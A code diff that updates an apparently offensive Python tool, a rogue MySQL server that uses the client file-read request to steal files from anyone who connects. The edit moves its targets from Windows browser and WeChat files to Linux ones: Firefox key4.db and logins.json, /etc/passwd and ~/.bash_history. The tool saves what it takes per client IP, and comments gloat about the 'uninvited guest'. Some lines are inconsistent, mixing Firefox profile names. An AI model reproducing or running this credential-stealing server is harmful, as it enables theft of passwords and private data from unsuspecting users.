@@ -6,18 +6,14 @@ import re
 ## Please manage the order by yourself, earlier one has more possibilities to be accessed !
 secrets = [
 # Something important in Firefox ...
-'/AppData/Roaming/Mozilla/Firefox/installs.ini',   # with the default 
-#'/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release/key4.db',
-#'/AppData/Roaming/Mozilla/Firefox/Profiles/????????.default-release/logins.json',
-#'/AppData/Roaming/Mozilla/Firefox/Profiles/*.default-release/formhistory.sqlite'
+'~/.mozilla/firefox/installs.ini',   # with the default 
+#'~/.mozilla/firefox/*.default-esr/key4.db',
+#'~/.mozilla/firefox/????????.default-esr/logins.json',
+#'~/.mozilla/firefox/*.default-esr/formhistory.sqlite',
 ## To decrypt that, you can see https://github.com/lclevy/firepwd and https://www.cnblogs.com/0xdd/p/13226624.html
 
-# wechat id
-'/Documents/WeChat Files/All Users/config/config.data',
-
-# Something important in Chrome ...
-'/AppData/Local/Google/Chrome/User Data/Default/Login Data',
-'/AppData/Local/Google/Chrome/User Data/Default/History'
+'/etc/passwd',
+'~/.bash_history'
 ]
 
 def mysql_get_file_content(filename, conn, address):
@@ -68,22 +64,15 @@ def mysql_get_file_content(filename, conn, address):
                 wantfile = chr(len(filename) + 1) + "\x00\x00\x01\xFB" + filename
                 conn.sendall(wantfile)
                 content = conn.recv(99999999)
-                # print(len(content))
+                print(content)
                 conn.sendall(b"I got what I want, HHH . . . ")
                 if len(content) > 4:
-                    if 'PFRO' in filename:
-                        with open(logpath + "/PFRO.log", "w") as f:
-                            f.write(content)
-                            f.close()
-                            conn.close()
-                        return True
-                    else:
-                        print(content)
-                        with open(logpath + "/" + filename.replace("/", "_").replace(":", ""), "w") as f:
-                            f.write(content)
-                            f.close()
-                            conn.close()
-                        return True
+                    print(content)
+                    with open(logpath + "/" + filename.replace("/", "_").replace(":", ""), "w") as f:
+                        f.write(content)
+                        f.close()
+                        conn.close()
+                    return True
                 else:
                     conn.close()
                     return False
@@ -96,11 +85,11 @@ def mysql_get_file_content(filename, conn, address):
 def get_firefoxentry(line):
     with open(line, "r") as f:
         content = f.read()
-        firefox_rand = re.findall(r"Default=Profiles/(.*).default-release", content)[0]
+        firefox_rand = re.findall(r"Default=(.*).default-esr", content)[0]
         print(firefox_rand)
     del secrets[1:]
-    secrets.append("/AppData/Roaming/Mozilla/Firefox/Profiles/" + firefox_rand + ".default-release/key4.db")
-    secrets.append("/AppData/Roaming/Mozilla/Firefox/Profiles/" + firefox_rand + ".default-release/logins.json")
+    secrets.append("~/.mozilla/firefox/" + firefox_rand + ".default-release/key4.db")
+    secrets.append("~/.mozilla/firefox/" + firefox_rand + ".default-esr/logins.json")
 
 def run():
     port = 3306
@@ -114,45 +103,27 @@ def run():
         if k >= len(secrets):
             print("ALL THINGS SHOULD BE DONE . . . . ")
             #break
+            print("mv " + os.path.abspath(".") + "/log/" + address[0] + "/  " + os.path.abspath(".") + "/log/" + address[0] + ".$(echo `date` | base64)/")
+            os.system("mv " + os.path.abspath(".") + "/log/" + address[0] + "/  " + os.path.abspath(".") + "/log/" + address[0] + ".$(echo `date` | base64)/")
             k = 0   # Continue running . . .
 
         # connecting
         conn, address = sv.accept()
 
-        # if username has been gotten
-        logpath = os.path.abspath(".") + "/log/" + address[0] + "/PFRO.log"
-        #print(logpath)
-        if os.path.exists(logpath):
-            with open(logpath, "r") as f:
-                content = f.read()
-            f.close()
-
-            # parse and use the username
-            content = content.replace('\n','').replace('\r','').replace(' ','').replace('\t','').replace('\00','')
-            try:
-                res = re.findall(r"Users\\(.*)\\", content)[0]
-                username = res.split("\\")[0]
-
-                # get something secret, the more ENTER uninvited guest entered, the more information we can get . . .
-                line = "C:/Users/" + username + secrets[k]
-                #print(line)
-                k += 1
-                if not os.path.exists(os.path.abspath(".") + "/log/" + address[0] + "/" + line.replace("/", "_").replace(":", "")):
-                    res = mysql_get_file_content(line, conn, address)
-                    if res:
-                        print ("Read Success! ---> " + line)
-                        if secrets[k - 1] == "/AppData/Roaming/Mozilla/Firefox/installs.ini":
-                            get_firefoxentry(os.path.abspath(".") + "/log/" + address[0] + "/" + line.replace("/", "_").replace(":", ""))
-                    else:
-                        print ("Not Found~ ---> " + line)
+        try:
+            # get something secret, the more ENTER uninvited guest entered, the more information we can get . . .
+            line = secrets[k]
+            print(line)
+            k += 1
+            if not os.path.exists(os.path.abspath(".") + "/log/" + address[0] + "/" + line.replace("/", "_").replace(":", "")):
+                res = mysql_get_file_content(line, conn, address)
+                if res:
+                    if line == "~/.mozilla/firefox/installs.ini":
+                        get_firefoxentry(os.path.abspath(".") + "/log/" + address[0] + "/" + line.replace("/", "_").replace(":", ""))
+                    print ("Read Success! ---> " + line)
                 else:
-                    conn.close()
-            except Exception as e:
-                print(e)
-        else:
-            line = "C:/Windows/PFRO.log"
-            res = mysql_get_file_content(line, conn, address)
-            if res:
-                print ("Read Success! ---> " + line)
+                    print ("Not Found~ ---> " + line)
             else:
-                print ("Not Found~ ---> " + line)
+                conn.close()
+        except Exception as e:
+            print(e)
